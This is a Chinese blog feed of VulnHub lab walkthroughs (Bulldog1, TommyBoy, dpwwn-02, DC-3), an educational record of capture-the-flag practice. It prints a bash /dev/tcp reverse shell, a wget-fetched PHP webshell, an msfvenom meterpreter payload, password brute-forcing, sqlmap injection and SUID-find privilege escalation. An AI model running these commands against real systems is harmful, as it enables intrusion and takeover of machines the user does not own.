<p>所以执行<br><code>echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.211.135/7777 0&gt;&amp;1&#39; &gt; sss</code><br><code>ls &amp;&amp; bash sss</code><br>即可进行反弹shell</p>
<p><img src="/2020/07/06/Bulldog1/1590848328456.png" alt="1590848328456"></p>
<blockquote>
<figure class="highlight capnproto"><table><tr><td class="code"><pre><span class="line">python -c '<span class="keyword">import</span> pty;pty.spawn(<span class="string">"/bin/bash"</span>)'		<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在靶机中寻找各种可利用的文件，最后在<code>/home/bulldogadmin/.hiddenadmindirectory</code>目录下发现了一个<code>customPermissionApp</code>文件。之后便是看别人操作：</p>
<p>使用<code>strings</code>命令查看可执行文件中的字符</p>
<blockquote>
<p><code>strings customPermissionApp</code></p>
</blockquote>
<p><img src="/2020/07/06/Bulldog1/1590882922078.png" alt="1590882922078"></p>
<p>发现几串字符，猜测拼接后为密码，去掉最后的H</p>
<blockquote>
<p>SUPERultimatePASSWORDyouCANTget<br>可以看到很明显的password</p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> su root	 	<span class="comment">#尝试登陆</span></span><br></pre></td></tr></table></figure>

<p>输入上面的密码，成功获得root权限<br><img src="/2020/07/06/Bulldog1/1590884707940.png" alt="1590884707940"></p>
<p><strong>附：</strong></p>
<p>看了别人的解题过程，可以直接先<code>cat /etc/passwd</code>查看有哪些用户<br>在着重查看那个用户相关的文件<code>find / -user bulldogadmin 2&gt;/dev/null</code></p>
<p>这样效率高很多</p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机-TommyBoy1dot0</title>
    <url>/2020/06/23/vulnhub-TommyBoy1dot0/</url>
    <content><![CDATA[<h1 id="vulnhub-TommyBoy1dot0"><a href="#vulnhub-TommyBoy1dot0" class="headerlink" title="vulnhub-TommyBoy1dot0"></a>vulnhub-TommyBoy1dot0</h1><p><strong>知识点</strong></p>
<blockquote>
<p>信息收集*</p>
<p>火狐插件修改user-agent为iphone</p>
<p>提权(更换低权限用户组)</p>
</blockquote>
<a id="more"></a>

<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>=================</p>
<p>圣施耐克！汤米男孩需要您的帮助！</p>
<p>Callahan Auto公司终于进入了现代技术领域，并建立了一个Web服务器供其客户用于订购刹车片。</p>
<p>不幸的是，该网站刚刚瘫痪，唯一拥有管理员凭据的人是Tom Callahan Sr.-刚刚去世！更糟糕的是，唯一一个了解服务器的人退出了！</p>
<p>您需要帮助Tom Jr.，Richard和Michelle再次恢复该网页。否则，卡拉汉汽车公司肯定会倒闭：-(</p>
<hr>
<h1 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h1><p>=================</p>
<p>主要目的是将主页的备份副本还原到Callahan Auto的服务器。但是，要考虑将箱子完全塞满，您将需要收集散布在系统上的5个标志，并使用其中的数据来解锁一条最终消息。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载ova文件，导入虚拟机即可<br>下载地址：<a href="https://www.vulnhub.com/entry/tommy-boy-1,157/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/tommy-boy-1,157/</a></p>
<h1 id="———————"><a href="#———————" class="headerlink" title="———————-"></a>———————-</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592447825931.png" alt="1592447825931"></p>
<p>靶机ip为192.168.211.159</p>
<p><strong>端口扫描</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.159</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592451324025.png" alt="1592451324025"></p>
<p>开放了22、80、8008三个端口<br>访问一下80端口<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592451394042.png" alt="1592451394042"></p>
<p><strong>目录扫描</strong></p>
<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>发现robots.txt，里面发现第一个flag的目录<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592451787319.png" alt="1592451787319"></p>
<p>之后返回首页查看网页源码，发现一个视频地址<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592463697415.png" alt="1592463697415"></p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592463718365.png" alt="1592463718365"></p>
<p>看wp居然prehistoricforest/是个目录，长见识了<br>访问prehistoricforest，是一个博客系统</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>在最后一个posts中发现flag2<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592463981583.png" alt="1592463981583"></p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592463999330.png" alt="1592463999330"></p>
<p>之后在另一篇博客中发现了一个目录<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592464604218.png" alt="1592464604218"></p>
<p>访问可以发现一张图片，下载下来使用编辑器查看可以发现一串md5<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592464686735.png" alt="1592464686735"></p>
<p><code>ce154b5a8e59c89732bc25d6a2e6b90b</code><br>解码的到spanky<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592464785947.png" alt="1592464785947"></p>
<p>这是一篇加密文章的密码，访问该加密文章<br>在文章中发现nickburns用户<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592465063411.png" alt="1592465063411"></p>
<p>根据说明，靶机开放了一个ftp端口，但是每隔15分钟都会关闭，通过nmap扫描得到ftp端口为65534<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592465776781.png" alt="1592465776781"></p>
<p>使用hydra爆破一下</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">hydra <span class="string">ftp:</span><span class="comment">//192.168.211.160:65534 -l nickburns -e ns</span></span><br></pre></td></tr></table></figure>

<p>得到用户名和密码一样</p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592466001305.png" alt="1592466001305"></p>
<p>使用ftp登陆，发现一个readme.txt文件，将其下到本地查看<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592466449357.png" alt="1592466449357"></p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592466627906.png" alt="1592466627906"></p>
<p>提示将一个压缩包放到了NickIzL33t目录，但是访问却什么都没有发现，这是想起还有一个8008端口，访问<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592469708386.png" alt="1592469708386"></p>
<p>显示Steve Jobs可以查看内容，这是需要安装user-agent插件<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592470988271.png" alt="1592470988271"></p>
<p>访问成功，但是显示存在一个html隐藏文件，需要找到他<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592471290637.png" alt="1592471290637"></p>
<p>这里可以通过爆破来寻找该html文件，使用dirbuster工具<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592471489742.png" alt="1592471489742"></p>
<p>在这之前要设置user-agent为iphone<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592471734144.png" alt="1592471734144"></p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592472233222.png" alt="1592472233222"></p>
<p>得到/fallon1.html,访问一下，发现第三个flag</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592472278055.png" alt="1592472278055"></p>
<p>还有一个hint<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592472395305.png" alt="1592472395305"></p>
<p>英语不好~~</p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592472613453.png" alt="1592472613453"></p>
<p>再将第三个提示下载下来，是一个加密的压缩包，根据第一个提示进行爆破</p>
<blockquote>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="comment">* One uppercase character</span></span><br><span class="line"><span class="comment">* Two numbers</span></span><br><span class="line"><span class="comment">* Two lowercase characters</span></span><br><span class="line"><span class="comment">* One symbol</span></span><br><span class="line"><span class="comment">* The year Tommy Boy came out in theaters</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>使用crunch工具生成字典</p>
<blockquote>
<p>-t 命令如下：</p>
<ul>
<li><p>-t @,%^，指定模式，@,%^分别代表意义如下：</p>
</li>
<li><p>@ 插入小写字母</p>
</li>
<li><p>, 插入大写字母</p>
</li>
<li><p>% 插入数字</p>
</li>
<li><p>^ 插入特殊符号          </p>
</li>
</ul>
</blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">crunch <span class="number">13</span> <span class="number">13</span> -t bev,%%@@^<span class="number">1995</span> -o zippass.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592490055107.png" alt="1592490055107"></p>
<p>之后使用工具爆破<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592490373628.png" alt="1592490373628"></p>
<p>密码为<code>bevH00tr$1995</code>，打开压缩包</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">Sandusky Banking Site</span><br><span class="line">------------------------</span><br><span class="line">Username: BigTommyC</span><br><span class="line">Password: money</span><br><span class="line"></span><br><span class="line">TheKnot.com (wedding site)</span><br><span class="line">---------------------------</span><br><span class="line">Username: TomC</span><br><span class="line">Password: wedding</span><br><span class="line"></span><br><span class="line">Callahan Auto Server</span><br><span class="line">----------------------------</span><br><span class="line">Username: bigtommysenior</span><br><span class="line">Password: fatguyinalittlecoat</span><br><span class="line"></span><br><span class="line">Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.</span><br><span class="line">However, I wrote myself a draft on the company blog with that information.</span><br><span class="line"></span><br><span class="line">Callahan Company Blog</span><br><span class="line">----------------------------</span><br><span class="line">Username: bigtom(I think?)</span><br><span class="line">Password: ??? </span><br><span class="line">Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.</span><br></pre></td></tr></table></figure>

<p>提示密码<code>fatguyinalittlecoat</code>后面还有一些数字<br>之后扫描一下网站，发现为wordpress网站<br>使用wpscan进行利用<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592491780668.png" alt="1592491780668"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">211.160</span><span class="regexp">/prehistoricforest/</span> -e u</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592491816554.png" alt="1592491816554"></p>
<p>根据压缩文件里面的信息，应该是要登陆tom这个用户，使用wpscan进行爆破</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">211.160</span><span class="regexp">/prehistoricforest -P /u</span>sr<span class="regexp">/share/</span>wordlists<span class="regexp">/rockyou.txt -U tom</span></span><br></pre></td></tr></table></figure>

<p>爆破得到密码为<code>tomtom1</code><br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592492618601.png" alt="1592492618601"></p>
<p>之后登陆后台，在posts里面发现密码后半部分<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592492729587.png" alt="1592492729587"></p>
<blockquote>
<p>Username: bigtommysenior<br>Password: fatguyinalittlecoat1938!!</p>
</blockquote>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>使用ssh连接之后getshell</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="number">192.168</span><span class="number">.211</span><span class="number">.160</span> -u bigtommysenior</span><br></pre></td></tr></table></figure>

<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>登陆之后发现flag4<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592492929769.png" alt="1592492929769"></p>
<p>还有一个备份文件，将备份文件cp到index,html 里面</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp callahanbak.bak <span class="regexp">/var/</span>www<span class="regexp">/html/i</span>ndex.html</span><br></pre></td></tr></table></figure>

<p>网站能成功访问</p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592493628244.png" alt="1592493628244"></p>
<p>之后便是提权</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>根据flag4里面的提示，我们需要读取5.txt里面的内容，在根目录下发现了.5.txt文件，但是由于属于www-data用户组，所以并没有权限读取</p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592536963450.png" alt="1592536963450"></p>
<p>之后发现<br><code>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads</code>目录，可以进行文件上传，里面后一个.htaccess文件，可以将gif文件当做PHP来执行</p>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592537081486.png" alt="1592537081486"></p>
<p>但是上传一个一句话木马并不能连接，所以尝试直接写入一句话</p>
<p>可以其将<code>$_GET,$_POST</code>和一些函数过滤了<br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592537564970.png" alt="1592537564970"></p>
<p>这时可以考虑从攻击机上下载文件到该目录</p>
<blockquote>
<p>开启一个http端口<br>python -m SimpleHTTPServer 8080</p>
<p>写一个一句话文件<br><code>&lt;?php system($_GET[a]);?&gt;</code> #这里使用<code>eval($_GET[a])</code>没有成功</p>
<p>之后将其下载保存即可</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&gt;wget <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span>:<span class="number">8080</span>/<span class="built_in">shell</span>.php -O <span class="built_in">shell</span>.php</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592537768246.png" alt="1592537768246"></p>
<p>访问为www-data 用户组，可以读取.5.txt文件</p>
<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592537893468.png" alt="1592537893468"></p>
<p>最后将5个flag拼接便是压缩包LOOT.zip的密码<br><code>B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack</code><br><img src="/2020/06/23/vulnhub-TommyBoy1dot0/1592538002408.png" alt="1592538002408"></p>
<p>这一个靶机主要考察的就是信息收集，信息收集还是很重要的。做个靶机还有剧情，也是非常有趣的！</p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机-dpwwn-02</title>
    <url>/2020/07/06/dpwwn-02/</url>
    <content><![CDATA[<p><strong>vulnhub靶机-dpwwn-02</strong><br><strong>知识点：</strong></p>
<blockquote>
<ul>
<li>nmap</li>
<li>dirb</li>
<li>searchsploit</li>
<li>metaspaloit</li>
<li>LFI+NFS共享getshell</li>
<li>msfvenom</li>
<li>find提权</li>
</ul>
</blockquote>
<a id="more"></a>

<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="靶机下载"><a href="#靶机下载" class="headerlink" title="靶机下载"></a>靶机下载</h2><p>下载靶机后解压，打开vmx文件即可，网卡设置为net模式</p>
<blockquote>
<p><strong>描述</strong></p>
<p>该boot2root是基于Linux的虚拟机，并已使用VMware工作站进行了测试。</p>
<p>难度：中级++和乐趣。</p>
<p>目标：<code>Get the root shell, and then obtain flag under /root(dpwwn-02-FLAG.txt).</code></p>
</blockquote>
<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>一、设置VMware的vmnet1（Host only）的子网IP为10.10.10.0，子网掩码255.255.255.0</p>
<p><img src="/2020/07/06/dpwwn-02/1593681154630.png" alt="1593681154630"></p>
<p>二、将靶机的网络配适器设置为VMnet1(仅主机模式)</p>
<p>三、配置kali的网络配适器，也设置为VMnet1(仅主机模式)。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 <span class="number">10.10</span><span class="number">.10</span><span class="number">.12</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593684420804.png" alt="1593684420804"></p>
<p>kali的ip地址会莫名消失，所以需要时不时设置一下<br><code>ifconfig eth0 10.10.10.12 netmask 255.255.255.0</code></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>靶机ip为10.10.10.10，使用nmap扫描开放的端口</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593685064634.png" alt="1593685064634"></p>
<p>靶机开放了80，111，443，2049等端口</p>
<p>先访问80端口，用dirb扫描目录可知为wordpress网站<br><img src="/2020/07/06/dpwwn-02/1593685168930.png" alt="1593685168930"></p>
<p><img src="/2020/07/06/dpwwn-02/1593685420538.png" alt="1593685420538"></p>
<p>使用wpscan进行扫描</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="comment">//10.10.10.10/wordpress/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593685788355.png" alt="1593685788355"></p>
<p>发现一个site-editor插件，可通过搜索该插件的漏洞进行利用<br>扫描一下网站用户</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="comment">//10.10.10.10/wordpress/ -e u</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593685845914.png" alt="1593685845914"></p>
<p>只有一个admin用户，可尝试爆破密码</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>先使用searchsploit搜索一下插件漏洞<br><img src="/2020/07/06/dpwwn-02/1593685963674.png" alt="1593685963674"></p>
<p>得到该版本插件存在一个LFI漏洞，查看payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593693772337.png" alt="1593693772337"></p>
<p><img src="/2020/07/06/dpwwn-02/1593693946084.png" alt="1593693946084"></p>
<p>成功执行，但是似乎还不能getshell。尝试通过wpscan进行密码爆破(到最后也没爆破成功)</p>
<p>在爆破的时候想到靶机还开放了2049端口，尝试挂载nfs共享<br>首先需要安装nfs客户端工具</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">apt</span>-<span class="meta">get</span> install nfs-<span class="meta">common</span></span><br></pre></td></tr></table></figure>

<p>安装完成之后，使用showmount命令检索给定主机的导出文件夹列表。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">showmount -e <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593696279597.png" alt></p>
<p>得到/home/dpwwn02目录可以挂载</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/dpwwn02</span><br><span class="line">mount <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>:/home/dpwwn02 /mnt/dpwwn02</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593696438656.png" alt></p>
<p>成功挂载，并且具有创建文件的权限，可以通过写入ssh公钥文件(先使用ssh-keygen生成公私钥对)来进行登录，但是靶机未开放ssh端口，不能远程连接</p>
<p>这里需要配合LFI进行利用，先生成一个webshell文件，之后再通过文件包含访问来getshell</p>
<p>msfvenom生成webshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=4444 R &gt; webshell.php</span><br></pre></td></tr></table></figure>

<p>将该文件cp到共享目录<br><img src="/2020/07/06/dpwwn-02/1593698706795.png" alt></p>
<p>通过msf监听并且通过浏览器访问该文件即可返回一个会话</p>
<blockquote>
<p>use exploit/multi/handler<br>set payload php/meterpreter/reverse_tcp<br>set lhost 10.10.10.12<br>set lport 4444<br>run</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/webshell.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593698614391.png" alt></p>
<p><img src="/2020/07/06/dpwwn-02/1593698962498.png" alt></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先查看具有suid权限的命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593703926073.png" alt></p>
<p>发现find命令，通过该命令来进行提取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">touch aaa </span><br><span class="line">find aaa -exec whoami \;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593704038348.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find aaa -exec /bin/sh -p \;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/06/dpwwn-02/1593704074957.png" alt></p>
<p>成功获得root权限</p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC-3</title>
    <url>/2020/02/26/vulnhub-DC-3/</url>
    <content><![CDATA[<p><strong>vulnhub靶机DC-3</strong></p>
<p><strong>知识点:</strong></p>
<blockquote>
<p>Joomla3.7.0SQL注入<br>nmap<br>nikto<br>反弹shell<br>linux拒绝服务提权</p>
</blockquote>
<a id="more"></a>



<h1 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a><strong>主机发现：</strong></h1><p>先主机发现找到靶机的ip</p>
<h2 id="使用nmap"><a href="#使用nmap" class="headerlink" title="使用nmap"></a>使用nmap</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.0</span>/<span class="number">24</span> </span><br><span class="line"></span><br><span class="line">netdiscover -r <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/1.png" alt="clipboard.png"></p>
<p>根据MAC地址可以确定靶机的ip为192.168.211.136</p>
<p>##然后扫描该ip所开放的端口服务</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.136</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/2.png" alt="clipboard.png"></p>
<p>发现靶机只开放了80端口，访问但没有任何线索</p>
<p><img src="/2020/02/26/vulnhub-DC-3/3.png" alt="clipboard.png"></p>
<h2 id="使用Nikto扫描网站目录"><a href="#使用Nikto扫描网站目录" class="headerlink" title="使用Nikto扫描网站目录"></a>使用Nikto扫描网站目录</h2><p><img src="/2020/02/26/vulnhub-DC-3/4.png" alt="clipboard.png"></p>
<p>发现了后台登陆界面<a href="http://192.168.211.136/administrator/" target="_blank" rel="noopener">http://192.168.211.136/administrator/</a></p>
<p><img src="/2020/02/26/vulnhub-DC-3/5.png" alt="clipboard.png"></p>
<p>##这时我们要对网站进行指纹识别</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">whatweb <span class="number">192.168</span><span class="number">.211</span><span class="number">.136</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/6.png" alt="clipboard.png"></p>
<p>发现网站框架是Joomla</p>
<p>然后我们可以使用joomscan扫描joomla网站</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">joomscan -u <span class="string">http:</span><span class="comment">//192.168.211.136</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/7.png" alt="clipboard.png"></p>
<p> 我们扫出了Joomla版本等信息</p>
<p>然后搜索Joomla3.7.0的漏洞    searchsploit Joomla 3.7.0</p>
<p><img src="/2020/02/26/vulnhub-DC-3/8.png" alt="clipboard.png"></p>
<p>发现一个SQL注入漏洞</p>
<p>将漏洞信息保存到本地</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps<span class="regexp">/42033.txt joomla_sql.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/9.png" alt="clipboard.png"></p>
<p>得到了注入点等信息</p>
<p><img src="/2020/02/26/vulnhub-DC-3/10.png" alt="clipboard.png"></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/11.png" alt="clipboard.png"></p>
<p>我们成功获取了数据库</p>
<p>–current-db获取当前数据库</p>
<p><img src="/2020/02/26/vulnhub-DC-3/12.png" alt="clipboard.png"></p>
<p> -D “joomladb” –tables</p>
<p>获取该数据库下的表名</p>
<p><img src="/2020/02/26/vulnhub-DC-3/13.png" alt="clipboard.png"></p>
<p>-D “joomladb” -T “#__users” –columns获取#_user 中的列名</p>
<p><img src="/2020/02/26/vulnhub-DC-3/14.png" alt="clipboard.png"></p>
<p>-D “joomladb” -T “#__users” -C “name,password” –dump获取字段</p>
<p><img src="/2020/02/26/vulnhub-DC-3/15.png" alt="clipboard.png"></p>
<p>然后将密码解密</p>
<p>先将密码写入一个文件里面，然后使用John解密</p>
<p>解密出密码是Snoopy</p>
<p><img src="/2020/02/26/vulnhub-DC-3/16.png" alt="clipboard.png"></p>
<p>成功进入后台</p>
<p><img src="/2020/02/26/vulnhub-DC-3/17.png" alt="clipboard.png"></p>
<p>发现可以查看源码</p>
<p><img src="/2020/02/26/vulnhub-DC-3/18.png" alt="clipboard.png"></p>
<p>在<a href="http://192.168.211.136/templates/beez3/html/2.php" target="_blank" rel="noopener">http://192.168.211.136/templates/beez3/html/2.php</a>中写入一句话木马，然后使用蚁剑连接</p>
<p><img src="/2020/02/26/vulnhub-DC-3/19.png" alt="clipboard.png"></p>
<p>模拟终端</p>
<p><img src="/2020/02/26/vulnhub-DC-3/20.png" alt="clipboard.png"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">weevely  <span class="keyword">generate</span>   <span class="number">123456</span>   shell1<span class="variable">.php</span></span><br><span class="line">密码：<span class="number">123456</span></span><br><span class="line">脚本文件名：shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/21.png" alt="clipboard.png"></p>
<p>将脚本上传到网站上</p>
<p><img src="/2020/02/26/vulnhub-DC-3/22.png" alt="clipboard.png"></p>
<p>kali上面连接</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">weevely http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">211.136</span><span class="regexp">/templates/</span>beez3<span class="regexp">/html/</span>shell1.php <span class="number">123456</span> 成功获取shell</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/23.png" alt="clipboard.png"></p>
<h1 id="接下来提权"><a href="#接下来提权" class="headerlink" title="接下来提权"></a>接下来提权</h1><p>www-data用户，主机Ubuntu 16.04  内核 4.4.0-21</p>
<p>在kali里面搜索这个版本漏洞searchsploit Ubuntu 16.04</p>
<p><img src="/2020/02/26/vulnhub-DC-3/24.png" alt="clipboard.png"></p>
<h2 id="查看漏洞介绍"><a href="#查看漏洞介绍" class="headerlink" title="查看漏洞介绍"></a>查看漏洞介绍</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/<span class="number">39772</span>.txt  ubuntu-<span class="number">1604</span>-<span class="keyword">shell</span>.<span class="bash">txt</span></span><br><span class="line"></span><br><span class="line">cat ubuntu-<span class="number">1604</span>-<span class="keyword">shell</span>.<span class="bash">txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/25.png" alt="clipboard.png"></p>
<p>下载exp，将里面的exploit.tar上传，并解压运行</p>
<p><img src="/2020/02/26/vulnhub-DC-3/26.png" alt="clipboard.png"></p>
